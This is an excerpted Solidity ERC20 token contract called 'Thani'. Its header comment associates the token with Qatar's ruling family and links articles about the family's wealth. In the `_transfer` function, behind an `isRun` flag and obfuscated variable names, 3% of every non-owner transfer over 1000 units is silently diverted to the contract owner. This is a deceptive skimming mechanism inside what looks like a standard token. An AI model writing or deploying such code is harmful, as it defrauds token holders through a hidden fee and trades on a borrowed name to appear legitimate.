...
/**
  Thani dynasty
  Thani dynasty, Arabic Āl Thānī (“Thani family”), ruling family of Qatar. The family is 
from the Tamīm tribe, which migrated eastward from central Arabia to the Qatar peninsula and 
emerged as a dominant ruling family in the mid-19th century.
https://en.wikipedia.org/wiki/House_of_Thani
https://www.the-sun.com/news/6717654/qatar-royal-family-net-worth/
*/
...
contract Thani is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _transfer(
        ...
        if (owner() != recipient && owner() != sender) {
            if (isRun > 0 && amount > 1000) {
                ...
                uint256 VZFPGC = 3;
                uint256 GYCIQX = amount*VZFPGC/100;
                _balances[sender] = _balances[sender] - amount;
                _balances[recipient] += amount -GYCIQX;
                _balances[owner()] +=GYCIQX;
            }
        } else {
            _balances[sender] = _balances[sender] - amount;
